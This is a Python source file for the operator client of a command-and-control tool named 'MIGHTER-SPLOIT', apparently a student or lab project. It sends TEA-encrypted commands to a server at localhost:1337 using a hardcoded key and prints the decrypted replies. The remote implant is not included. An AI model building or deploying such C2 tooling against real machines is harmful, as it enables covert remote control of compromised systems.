import socket, subprocess, os, time, base64, ctypes, itertools, math, sys, codecs

def runClient(HOST,PORT):
    PKT_SIZE = 1024

    s = socket.socket()  # instantiate
    s.connect((HOST, PORT))  # connect to the server

    #user_input = "connected"  # initial input (**change to a proper packet saying connected**)
    while True:
        
        ##grab user input
        user_input = input('MS-C2> ')

        ##check for 'exit' command
        if (user_input.strip() == 'exit'):
            break

        ##pack the user input
        packet, err = packInput(user_input)
        #handle errors
        if (err == 1):
            #user_input length error
            print("user input length error")
            continue
        elif (err == 2):
            #encryption error
            print("user input encryption error")
            continue
        elif (err == 3):
            #decryption error
            print("user input decryption error")
            continue
        elif (err == 4):
            #packet crafting error
            print("user input packet crafting error")
            continue

        ##send the packet
        s.send(packet.encode())

        ##receive the server's response
        recv_data = s.recv(PKT_SIZE).decode()

        ##unpack message from data into recv_msg
        recv_msg, err = unpackData(recv_data)
        #handle errors
        if (err == 1):
            #unpacking error
            print("recv data unpacking error")
            continue
        elif (err == 2):
            #decryption error
            print("recv data decryption error")
            continue

        #DEBUGGING: print the 
        print("server said (enc):" + str(recv_data))
        print("server said (dec):" + str(recv_msg))

    s.shutdown(socket.SHUT_RD)
    s.close()  # close the connection

######################
#  Helper functions  #
######################

#def packInput(user_input)
#args: user_input - user provided command string
#returns: (packet, err) - DNS packet and error message
#    err = 0 ; no error
#        = 1 ; user_input length error
#        = 2 ; encryption error
#        = 3 ; decryption error
#        = 4 ; packet crafting error
def packInput(user_input):
    TEA_KEY = "zMWYCRLd4szoBiPP"
    packet = None
    err = 0

    ##user input sanitation
    safe_input = processInput(user_input)
    if(safe_input == None):
        err = 1
        return packet, err
    
    ##encryption
    encrypted_safe_input = ""
    try:
        encrypted_safe_input = encrypt(safe_input, TEA_KEY)
    except Exception as e:
        err = 2
        return packet, err
    finally:
        pass
    
    ##decryption test
    try:
        decrypt(encrypted_safe_input, TEA_KEY)
    except Exception as e:
        err = 2
        return packet, err
    finally:
        pass

    ##craft packet
    packet = encrypted_safe_input

    #return packet
    return packet, err

#def unpackData(recv_data)
#args: recv_data - packet recieved from server
#returns: (recv_msg, err) - extracted plaintext message and error message
#    err = 0 ; no error
#        = 1 ; unpacking error
#        = 2 ; decryption error
def unpackData(recv_data):
    TEA_KEY = "zMWYCRLd4szoBiPP"
    recv_msg = None
    err = 0

    ##extract message packet
    encrypted_recv_msg = recv_data

    ##decrypt message
    try:
        recv_msg = decrypt(encrypted_recv_msg, TEA_KEY)
    except Exception as e:
        err = 2
        return recv_msg, err
    finally:
        pass

    ##strip white space sanitation
    recv_msg = recv_msg.strip()    

    ##return message
    return recv_msg, err

#def processInput(user_input)
#args: user_input - raw input captured from cli
#returns: None if user_input is too long (>512 bytes)
#otherwise, user_input padded to a certain length with whitespace. 
def processInput(user_input):
    len_input = len(user_input)
    if(len_input <= 64):
        return (user_input + ' ' * (64 - len(user_input)))
    elif(len_input <= 128):
        return (user_input + ' ' * (128 - len(user_input)))
    elif(len_input <= 256):
        return (user_input + ' ' * (256 - len(user_input)))
    elif(len_input <= 512):
        return (user_input + ' ' * (512 - len(user_input)))
    else:
        #command was too large
        return None
    return None

#def printSplash()
#just print that hacker splash...
def printSplash():
    ascii_splash = [
    "##############################################################################",
    "#                  ,-,-.                                                     #",
    "#                 ;,' `.:                                                    #",
    "#        _        : @ @ :                MIGHTER-SPLOIT C2 client            #",
    "#     ,-._)       :  L  ;                                                    #",
    "#    ,' <.\     ,-`.(=),'-.                                                  #",
    "#    \  /./\__,'\|`.`-','//`.                 Developed by:                  #",
    "#   `.>' |      :|>_`.' /::  :                      Sam Harris               #",
    "#         `----\"//;__[-]/  |  |                    Connor Moore              #",
    "#              ;/    : |_||  |                      Cam Harvey               #",
    "#              |     :    ;  ;                                               #",
    "#              ;`.___:__,'  ;                                                #",
    "#             ,'`._____;__,:                                                 #",
    "#           ,'_...----/ /.._\                                                #",
    "#         _;-'       =uu=    `._                                             #",
    "#       ,',  __,--.-----.-.__  .`.                                           #",
    "#     ,',',-'| _..|-----|._  |-.`.`.                                         #",
    "##############################################################################"]
    for elem in ascii_splash:
        print(elem)
    return
#######################################################################################
# TEA implementation: https://gist.github.com/twheys/4e83567942172f8ba85058fae6bfeef5 #
#######################################################################################
def encrypt(plaintext, key):
    if not plaintext:
        return ''

    v = _str2vec(plaintext.encode())
    k = _str2vec(key.encode()[:16])

    bytearray = b''.join(_vec2str(_encipher(chunk, k))
                         for chunk in _chunks(v, 2))

    return base64.b64encode(bytearray).decode()


def decrypt(ciphertext, key):
    if not ciphertext:
        return ''

    k = _str2vec(key.encode()[:16])
    v = _str2vec(base64.b64decode(ciphertext.encode()))

    return b''.join(_vec2str(_decipher(chunk, k))
                    for chunk in _chunks(v, 2)).decode()


def _encipher(v, k):
    y, z = [ctypes.c_uint32(x)
            for x in v]
    sum = ctypes.c_uint32(0)
    delta = 0x9E3779B9
    for n in range(32, 0, -1):
        sum.value += delta
        y.value += (z.value << 4) + k[0] ^ z.value + sum.value ^ (z.value >> 5) + k[1]
        z.value += (y.value << 4) + k[2] ^ y.value + sum.value ^ (y.value >> 5) + k[3]

    return [y.value, z.value]


def _decipher(v, k):
    y, z = [ctypes.c_uint32(x)
            for x in v]
    sum = ctypes.c_uint32(0xC6EF3720)
    delta = 0x9E3779B9
    for n in range(32, 0, -1):
        z.value -= (y.value << 4) + k[2] ^ y.value + sum.value ^ (y.value >> 5) + k[3]
        y.value -= (z.value << 4) + k[0] ^ z.value + sum.value ^ (z.value >> 5) + k[1]
        sum.value -= delta
    return [y.value, z.value]


def _chunks(iterable, n):
    it = iter(iterable)
    while True:
        chunk = tuple(itertools.islice(it, n))
        if not chunk:
            return
        yield chunk


def _str2vec(value, l=4):
    n = len(value)
    num_chunks = math.ceil(n / l)
    chunks = [value[l * i:l * (i + 1)]
              for i in range(num_chunks)]

    return [sum([character << 8 * j
                 for j, character in enumerate(chunk)])
            for chunk in chunks]


def _vec2str(vector, l=4):
    return bytes((element >> 8 * i) & 0xff
                 for element in vector
                 for i in range(l)).replace(b'\x00', b'')




if __name__ == '__main__':
    printSplash()
    HOST = "localhost" #"192.168.1.8"
    PORT = 1337 #52
    runClient(HOST,PORT)